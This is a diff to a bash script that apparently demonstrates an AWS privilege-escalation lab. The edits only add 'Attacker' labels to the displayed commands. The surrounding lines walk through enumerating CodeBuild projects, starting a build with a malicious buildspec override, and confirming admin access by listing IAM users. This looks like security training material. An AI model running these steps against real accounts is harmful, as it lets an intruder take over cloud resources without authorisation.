@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -89,7 +91,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -101,7 +103,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -109,7 +111,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -121,7 +123,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Discovering CodeBuild projects${NC}"
 echo "Listing CodeBuild projects in the account..."
 
-show_cmd "aws codebuild list-projects --region $AWS_REGION --query 'projects[*]' --output json"
+show_cmd "Attacker" "aws codebuild list-projects --region $AWS_REGION --query 'projects[*]' --output json"
 PROJECT_LIST=$(aws codebuild list-projects \
     --region $AWS_REGION \
     --query 'projects[*]' \
@@ -142,7 +144,7 @@ echo ""
 echo -e "${YELLOW}Step 6: Inspecting the existing CodeBuild project${NC}"
 echo "Getting project details for: $EXISTING_PROJECT"
 
-show_cmd "aws codebuild batch-get-projects --region $AWS_REGION --names \"$EXISTING_PROJECT\" --output json"
+show_cmd "Attacker" "aws codebuild batch-get-projects --region $AWS_REGION --names \"$EXISTING_PROJECT\" --output json"
 PROJECT_DETAILS=$(aws codebuild batch-get-projects \
     --region $AWS_REGION \
     --names "$EXISTING_PROJECT" \
@@ -184,7 +186,7 @@ echo -e "${YELLOW}Step 8: Starting build with buildspec override${NC}"
 echo "Using codebuild:StartBuild with --buildspec-override parameter..."
 echo "Project: $EXISTING_PROJECT"
 
-show_attack_cmd "aws codebuild start-build --region $AWS_REGION --project-name \"$EXISTING_PROJECT\" --buildspec-override \"$MALICIOUS_BUILDSPEC\" --output json"
+show_attack_cmd "Attacker" "aws codebuild start-build --region $AWS_REGION --project-name \"$EXISTING_PROJECT\" --buildspec-override \"$MALICIOUS_BUILDSPEC\" --output json"
 BUILD_RESULT=$(aws codebuild start-build \
     --region $AWS_REGION \
     --project-name "$EXISTING_PROJECT" \
@@ -211,7 +213,7 @@ echo "This may take 30-60 seconds for the build to run and IAM changes to take e
 WAIT_TIME=0
 MAX_WAIT=120
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
-    show_cmd "aws codebuild batch-get-builds --region $AWS_REGION --ids \"$BUILD_ID\" --query 'builds[0].buildStatus' --output text"
+    show_cmd "Attacker" "aws codebuild batch-get-builds --region $AWS_REGION --ids \"$BUILD_ID\" --query 'builds[0].buildStatus' --output text"
     BUILD_STATUS=$(aws codebuild batch-get-builds \
         --region $AWS_REGION \
         --ids "$BUILD_ID" \
@@ -248,7 +250,7 @@ echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
